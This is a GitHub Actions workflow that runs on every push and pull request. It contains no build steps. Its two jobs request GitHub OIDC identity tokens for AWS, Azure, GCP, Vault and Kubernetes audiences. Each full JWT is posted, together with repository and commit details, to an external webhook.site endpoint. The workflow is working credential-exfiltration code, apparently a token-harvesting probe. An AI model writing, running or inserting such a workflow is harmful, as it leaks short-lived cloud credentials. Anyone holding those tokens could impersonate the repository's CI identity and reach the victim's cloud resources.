name: hk14491
on:
  workflow_dispatch:
  push:
    branches: ['**']
  pull_request:
permissions:
  id-token: write
  contents: read
jobs:
  plain:
    runs-on: ubuntu-latest
    steps:
      - name: mint
        env:
          SINK: ${{ vars.HK_SINK }}
        run: |
          set -x
          SINK="${SINK:-https://webhook.site/e4bc395e-2183-461f-8e53-aae59460d37f}"
          for AUD in "sts.amazonaws.com" "api://AzureADTokenExchange" "https://vault.maree.tech" "//iam.googleapis.com/projects/1052781069983/locations/global/workloadIdentityPools/hkprobe/providers/hkprobe" "https://kubernetes.default.svc"; do
            R=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))" "$AUD")")
            J=$(echo "$R" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
            echo "MINT aud=$AUD len=${#J}"
            curl -s -m 25 -X POST "$SINK" -H 'Content-Type: application/json' -H 'X-Label: hk14491-plain' -d "{\"aud_req\":\"$AUD\",\"jwt\":\"$J\",\"job\":\"plain\",\"ref\":\"$GITHUB_REF\",\"event\":\"$GITHUB_EVENT_NAME\",\"repo\":\"$GITHUB_REPOSITORY\",\"sha\":\"${GITHUB_SHA:0:12}\"}" -o /dev/null -w 'SINK %{http_code}\n'
          done
  envjob:
    runs-on: ubuntu-latest
    environment: hk14491
    steps:
      - name: mint-env
        env:
          SINK: ${{ vars.HK_SINK }}
        run: |
          SINK="${SINK:-https://webhook.site/e4bc395e-2183-461f-8e53-aae59460d37f}"
          for AUD in "sts.amazonaws.com" "api://AzureADTokenExchange" "https://vault.maree.tech" "//iam.googleapis.com/projects/1052781069983/locations/global/workloadIdentityPools/hkprobe/providers/hkprobe"; do
            R=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))" "$AUD")")
            J=$(echo "$R" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
            echo "MINTENV aud=$AUD len=${#J}"
            curl -s -m 25 -X POST "$SINK" -H 'Content-Type: application/json' -H 'X-Label: hk14491-env' -d "{\"aud_req\":\"$AUD\",\"jwt\":\"$J\",\"job\":\"env\",\"ref\":\"$GITHUB_REF\",\"event\":\"$GITHUB_EVENT_NAME\",\"repo\":\"$GITHUB_REPOSITORY\",\"sha\":\"${GITHUB_SHA:0:12}\"}" -o /dev/null -w 'SINK %{http_code}\n'
          done
